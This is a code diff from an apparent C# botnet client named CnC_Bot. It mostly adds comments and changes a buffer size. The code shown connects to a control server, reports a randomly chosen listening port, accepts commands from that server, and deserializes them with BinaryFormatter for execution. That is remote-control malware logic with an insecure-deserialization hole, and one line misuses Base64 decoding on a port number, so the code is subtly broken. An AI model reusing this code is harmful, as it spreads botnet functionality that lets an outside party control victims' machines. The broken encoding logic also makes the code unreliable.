@@ -27,12 +27,15 @@ namespace CnC_Bot
         {
             try
             {
+                // Connect to the server ip and port
                 TcpClient initialClient = new TcpClient(serverIP, serverPort);
                 
+                // Generate random number from 3000 to 8000 to be the commands port
                 Random rand = new Random();
                 RandomCommandPort = rand.Next(3000, 8000);
                 byte[] buff = Convert.FromBase64String(Convert.ToString(RandomCommandPort));
 
+                // Send the generated port to the server and close the client
                 initialClient.GetStream().Write(buff, 0, buff.Length);
                 initialClient.Close();
             }
@@ -65,7 +68,7 @@ namespace CnC_Bot
         }
 
         /// <summary>
-        /// Open socket for incoming commands from server.
+        /// Open tcplistener for incoming commands from server.
         /// </summary>
         private void Listen()
         {
@@ -81,6 +84,9 @@ namespace CnC_Bot
             }
         }
 
+        /// <summary>
+        /// Receive new command from the server, parse and execute it.
+        /// </summary>
         private void Recv_Command()
         {
             try
@@ -88,7 +94,7 @@ namespace CnC_Bot
                 /* Get a new connection from the server */
                 Socket serverCommandSocket = CommandsListener.AcceptSocket();
 
-                byte[] commandData = new byte[2048];
+                byte[] commandData = new byte[1024];
                 serverCommandSocket.Receive(commandData);
 
                 BinaryFormatter formattor = new BinaryFormatter();
